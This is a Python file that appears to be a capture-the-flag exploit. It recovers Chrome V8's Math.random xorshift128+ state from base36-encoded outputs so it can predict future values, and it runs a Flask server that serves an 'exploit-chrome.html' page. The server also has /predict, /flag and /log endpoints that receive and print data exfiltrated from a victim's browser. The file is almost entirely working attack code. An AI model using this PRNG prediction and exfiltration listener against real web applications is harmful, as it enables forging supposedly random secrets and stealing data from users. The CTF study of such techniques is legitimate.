import z3
import struct
import numpy
from math import nextafter, inf

def base36_to_double(n):
  """
    Inverts (num).toString(36).slice(2) from JavaScript to get `num`.
    Example:
    >>> base36_to_double("dv7xjxbdnm6")
    0.38520087536951264
    >>> base36_to_double("z")
    0.9722222222222222
  """
  return int(n, 36) / 36**len(n)


# Chrome predictor
# Based on https://github.com/kalmarunionenctf/kalmarctf/blob/main/2025/web/spukhafte/solution/solve.py
# With adjustemnts to account for a recent change:
#   - https://source.chromium.org/chromium/_/chromium/v8/v8/+/e0609ce60acf83df5c6ecd8f1e02f771e9fc6538

MASK = 0xffffffffffffffff

def init_state():
    mtx = [[0]*i + [1] + [0]*(127-i) for i in range(128)]
    return mtx[:64], mtx[64:]

def shl_sym(mtx, n):
    return mtx[n:] + [[0]*128]*n

def shr_sym(mtx, n):
    return [[0]*128]*n + mtx[:-n]

def xor_sym(a, b):
    return [[aaa^bbb for aaa, bbb in zip(aa, bb)] for aa, bb in zip(a, b)]

def xs128p_sym(old_s0, old_s1):
    s1, s0 = old_s0, old_s1
    s1 = xor_sym(s1, shl_sym(s1, 23))
    s1 = xor_sym(s1, shr_sym(s1, 17))
    s1 = xor_sym(s1, s0)
    s1 = xor_sym(s1, shr_sym(s0, 26))
    return s1

def xs128p(old_s0, old_s1):
    s1, s0 = old_s0, old_s1
    s1 ^= (s1 << 23) & MASK
    s1 ^= (s1 >> 17)
    s1 ^= s0
    s1 ^= (s0 >> 26)
    return s1

def mh(h):
    h ^= h >> 33
    h = (h * 0xFF51AFD7ED558CCD) & MASK
    h ^= h >> 33
    h = (h * 0xC4CEB9FE1A85EC53) & MASK
    h ^= h >> 33
    return h

def mh_inv(h):
    h ^= h >> 33
    h = (h * 0x9cb4b2f8129337db) & MASK
    h ^= h >> 33
    h = (h * 0x4f74430c22a54005) & MASK
    h ^= h >> 33
    return h

def bits_to_int(bits: list[bool]) -> int:
    return int("".join(map(str, map(int, bits))), 2)

def int_to_bits(n, length):
    return [((n >> (length - i - 1)) & 1) for i in range(length)]

def reverse17(val):
    return val ^ (val >> 17) ^ (val >> 34) ^ (val >> 51)

def reverse23(val):
    return (val ^ (val << 23) ^ (val << 46)) & MASK

def xs128p_backward(s0, s1):
    prev_s0 = s1 ^ (s0 >> 26)
    prev_s0 = prev_s0 ^ s0
    prev_s0 = reverse17(prev_s0)
    prev_s0 = reverse23(prev_s0)
    return prev_s0

def state_to_double(s0: int) -> float:
    return float(s0 >> 11) / (1 << 53)

def get_mantissa(val: float) -> int:
    a = int(val * 2**53)
    return a & 0x001F_FFFF_FFFF_FFFF

def validate_solution_v8(s0, s1, count=128):
    for _ in range(count):
        if mh(s0^MASK) == s1:
            return mh_inv(s0)
        s0, s1 = xs128p_backward(s0, s1), s0

def validate_solution_mr(s0, s1, count=128):
    for _ in range(count):
        if mh_inv(s0) == mh_inv(s1)^MASK:
            return mh_inv(s0)
        s0, s1 = xs128p_backward(s0, s1), s0

def solve_basic_state(A, b):
    from sage.all import matrix, vector, GF
    F = GF(2)
    mtx = matrix(F, A)
    vec = vector(F, b)

    sol = mtx.solve_right(vec)
    return bits_to_int(sol[:64]), bits_to_int(sol[64:])

def solve_math_random(numbers):
    s0, s1 = init_state()

    A = []
    b = []
    for n in numbers[::-1]:
        A += s0[:53]
        b += int_to_bits(get_mantissa(n), 53)
        s0, s1 = s1, xs128p_sym(s0, s1)

    s0, s1 = solve_basic_state(A, b)
    return validate_solution_mr(s0, s1)

def iter_math_random(seed):
    s0, s1 = mh(seed), mh(seed^MASK)
    while True:
        block = []
        for _ in range(64):
            s0, s1 = s1, xs128p(s0, s1)
            block.append(state_to_double(s0))
        yield from block[::-1]

def test_chrome_predict():
  # A few random numbers generated by Chrome. The predictor should be
  # able to calculate the last number, given the previous ones.
  TEST_CASE = [0.32284380995926687, 0.35892538730903745, 0.2015652930688271, 0.7344003713130659, 0.49034320661854625]

  seed = solve_math_random(TEST_CASE[:-1])
  iter = iter_math_random(seed)
  preds = [next(iter) for i in range(0,5)]

  assert preds[-1] == TEST_CASE[-1], f"{preds[-1]} != {TEST_CASE[-1]}"

test_chrome_predict()

import itertools

def chunks(s, lengths):
  start = 0
  i = 0
  while True:
    if i >= len(lengths):
      l = len(s)
    else:
      l = lengths[i]
    chunk = s[start:start+l]
    i += 1
    start += l
    if chunk == '':
      return
    yield chunk

def chrome_predict_salt(salt, n=5):
  for lens in itertools.product([11, 10, 12, 9], repeat=5):
    if sum(lens) != len(salt): continue
    nums = list(chunks(salt, lens))
    nums = [base36_to_double(n) for n in nums]
    # print(nums)
    try:
      seed = solve_math_random(nums)
      iter = iter_math_random(seed)
      return [next(iter) for i in range(0,n+5)]
    except:
      pass


from flask import Flask, send_file, jsonify 
import time
import os

# : Hardcoded path for the cloud server, edit as per your requirement
SCRIPT_DIR = '/home/garyalisanat' 

app = Flask(__name__)

@app.route("/")
def hello():
  return "Hello"

@app.route("/sleep/<int:ms>")
def sleep(ms):
  time.sleep(ms/1000)
  return "sleep"

@app.route("/exploit-eolldodkgm9")
def exploit():
  return send_file(os.path.join(SCRIPT_DIR, 'exploit-chrome.html'))

@app.route("/predict/<salt>")
def predict(salt):
  predictions = chrome_predict_salt(salt, 5000) or []
  return jsonify(predictions) 
  
@app.route("/test")
def test():
  try:
    return send_file(os.path.join(SCRIPT_DIR, 'test-random.html'))
  except FileNotFoundError:
    return "File not found", 404

@app.route("/flag/<flag>")
def say_flag(flag):
  print("FLAG CAPTURED:", flag)
  return "Hello"

@app.route("/log/<l>")
def log(l):
  print(l)
  return "Hello"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port='80')
